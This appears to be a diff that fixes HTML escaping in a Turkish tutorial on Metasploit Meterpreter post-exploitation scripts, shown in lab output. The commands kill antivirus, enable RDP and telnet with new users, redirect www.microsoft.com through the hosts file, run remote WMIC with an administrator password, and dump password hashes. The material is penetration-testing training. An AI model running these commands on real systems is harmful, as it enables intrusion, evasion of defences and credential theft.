@@ -56,7 +56,7 @@ Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpr
 
 
 ```bash
- meterpreter **&gt;** run checkvm   **[*********]** Checking **if **SSHACKTHISBOX-0 is a Virtual Machine ........
+ meterpreter **>** run checkvm   **[*********]** Checking **if **SSHACKTHISBOX-0 is a Virtual Machine ........
  **[*********]** This is a VMware Workstation/Fusion Virtual Machine
 ```
 
@@ -70,7 +70,7 @@ Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpr
 
 
 ```bash
- meterpreter **&gt;** run getcountermeasure  **[*********]** Running Getcountermeasure on the target... 
+ meterpreter **>** run getcountermeasure  **[*********]** Running Getcountermeasure on the target... 
  **[*********]** Checking **for **contermeasures...
  **[*********]** Getting Windows Built **in **Firewall configuration...
  **[*********]**    
@@ -101,7 +101,7 @@ Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpr
 
 
 ```bash
- meterpreter **&gt;** run getgui 
+ meterpreter **>** run getgui 
 
 **[!]** Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
 **[!]** Example: run post/windows/manage/enable_rdp OPTION**=**value **[**...]
@@ -115,7 +115,7 @@ OPTIONS:
     -f   Forward RDP Connection.
     -h        Help menu.
     -p   The Password of the user to add.
-    -u   The Username of the user to add. meterpreter **&gt;** run getgui -e **[*********]** Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+    -u   The Username of the user to add. meterpreter **>** run getgui -e **[*********]** Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
  **[*********]** Carlos Perez carlos_perez@darkoperator.com
  **[*********]** Enabling Remote Desktop
  **[*********]** RDP is already enabled
@@ -134,7 +134,7 @@ OPTIONS:
 
 
 ```bash
-meterpreter **&gt;** run get_local_subnets 
+meterpreter **>** run get_local_subnets 
 
 Local subnet: 10.211.55.0/255.255.255.0
 ```
@@ -149,7 +149,7 @@ Local subnet: 10.211.55.0/255.255.255.0
 
 
 ```bash
-meterpreter **&gt;** run gettelnet 
+meterpreter **>** run gettelnet 
 Windows Telnet Server Enabler Meterpreter Script
 Usage: gettelnet -u  -p 
 
@@ -161,7 +161,7 @@ OPTIONS:
     -p   The Password of the user to add.
     -u   The Username of the user to add.
  
-meterpreter **&gt;** run gettelnet -e
+meterpreter **>** run gettelnet -e
 
 **[*********]** Windows Telnet Server Enabler Meterpreter Script
 **[*********]** Setting Telnet Server Services service startup mode
@@ -179,7 +179,7 @@ meterpreter **&gt;** run gettelnet -e
 
 
 ```bash
-meterpreter **&gt;** run hostsedit 
+meterpreter **>** run hostsedit 
 
 **[!]** Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
 **[!]** Example: run post/windows/manage/inject_host OPTION**=**value **[**...]
@@ -199,7 +199,7 @@ Example:
 
 run hostsedit -e 127.0.0.1,google.com
 
-run hostsedit -l /tmp/fakednsentries.txt meterpreter **&gt;** run hostsedit -e 10.211.55.162,www.microsoft.com
+run hostsedit -l /tmp/fakednsentries.txt meterpreter **>** run hostsedit -e 10.211.55.162,www.microsoft.com
  **[*********]** Making Backup of the hosts file.
  **[*********]** Backup loacated **in **C:\WINDOWS\System32\drivers\etc\hosts62497.back
  **[*********]** Adding Record **for **Host <a href="http://www.microsoft.com/">www.microsoft.com</a> with IP 10.211.55.162
@@ -216,7 +216,7 @@ run hostsedit -l /tmp/fakednsentries.txt meterpreter **&gt;** run hostsedit -e 1
 
 
 ```bash
- meterpreter **&gt;** run killav  **[*********]** Killing Antivirus services on the target...
+ meterpreter **>** run killav  **[*********]** Killing Antivirus services on the target...
  **[*********]** Killing off cmd.exe...
 ```
 
@@ -230,7 +230,7 @@ run hostsedit -l /tmp/fakednsentries.txt meterpreter **&gt;** run hostsedit -e 1
 
 
 ```bash
-meterpreter **&gt;** run remotewinenum
+meterpreter **>** run remotewinenum
 
 **[!]** Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
 **[!]** Example: run post/windows/gather/wmic_command OPTION**=**value **[**...]
@@ -245,7 +245,7 @@ OPTIONS:
     -h        Help menu.
     -p   Password of user on target system
     -t   The target address
-    -u   User on the target system **(**If not provided it will use credential of process**)** meterpreter **&gt;** run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128 **[*********]** Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
+    -u   User on the target system **(**If not provided it will use credential of process**)** meterpreter **>** run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128 **[*********]** Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
  **[*********]** Running WMIC Commands ....
  **[*********]**     running command wimic environment list
  **[*********]**     running command wimic share list
@@ -279,7 +279,7 @@ OPTIONS:
 
 
 ```bash
-meterpreter **&gt;** run scraper **[*********]** New session on 10.211.55.128:4444...
+meterpreter **>** run scraper **[*********]** New session on 10.211.55.128:4444...
  **[*********]** Gathering basic system information...
  **[*********]** Dumping password hashes...
  **[*********]** Obtaining the entire registry...
@@ -304,7 +304,7 @@ Yukarıdaki örneklerde görüldüğü gibi, Meterpreter script kodlarıyla oldu
 
 
 ```bash
-meterpreter **&gt;** run winenum  **[*********]** Running Windows Local Enumerion Meterpreter Script
+meterpreter **>** run winenum  **[*********]** Running Windows Local Enumerion Meterpreter Script
  **[*********]** New session on 10.211.55.128:4444...
  **[*********]** Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
  **[*********]** Checking **if **SSHACKTHISBOX-0 is a Virtual Machine ........
